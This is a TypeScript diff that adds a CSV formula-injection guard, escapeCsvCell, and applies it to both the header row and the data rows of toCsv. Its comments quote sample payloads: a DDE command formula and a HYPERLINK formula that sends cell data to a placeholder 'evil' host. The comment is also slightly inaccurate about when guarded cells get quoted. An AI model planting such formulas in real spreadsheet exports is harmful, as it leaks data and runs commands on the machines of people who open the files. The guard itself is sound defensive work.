@@ -33,14 +33,41 @@ export function parseJsonList(json?: string | null): string[] {
   }
 }
 
+/**
+ * Leading characters that make a spreadsheet treat a CSV cell as a formula
+ * rather than as text (CWE-1236 "Formula Injection").
+ *
+ *   =  -> =SUM(...), =HYPERLINK(...), =cmd|'/c calc'!A1   (DDE / CSV injection)
+ *   +  -> +1+1 is evaluated as a formula
+ *   -  -> -1+1 is evaluated as a formula
+ *   @  -> @SUM(...) is evaluated as a formula (Lotus-legacy syntax)
+ *   \t -> TAB (0x09) and CR (0x0D) are stripped/ignored by Excel when they lead
+ *   \r    a cell, so "  \t=SUM(1)" still executes. They must be guarded too.
+ */
+const CSV_FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * Neutralise a single CSV cell against spreadsheet formula injection.
+ *
+ * A cell whose first character is one of `= + - @ TAB CR` is prefixed with a
+ * single apostrophe and quoted. Excel / LibreOffice / Google Sheets then parse
+ * the cell as text (`'=SUM(A1)` renders literally) instead of evaluating it,
+ * which is what stops a row like `=HYPERLINK("http://evil/?d="&A1)` or
+ * `=cmd|'/c calc'!A1` from executing when an operator opens the exported file.
+ *
+ * Exported so the guard can be unit-tested and reused by other serialisers.
+ */
+export function escapeCsvCell(value: unknown): string {
+  const s = value == null ? '' : String(value);
+  const guarded = CSV_FORMULA_LEAD.test(s) ? `'${s}` : s;
+  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
+}
+
 export function toCsv<T extends object>(rows: T[]): string {
   if (rows.length === 0) return '';
   const headers = Object.keys(rows[0]);
-  const escape = (v: unknown) => {
-    const s = v == null ? '' : String(v);
-    return /[\",\n]/.test(s) ? `"${s.replace(/\"/g, '""')}"` : s;
-  };
-  const lines = [headers.join(',')];
+  const escape = escapeCsvCell;
+  const lines = [headers.map(escape).join(',')];
   for (const row of rows) {
     lines.push(headers.map((h) => escape((row as Record<string, unknown>)[h])).join(','));
   }
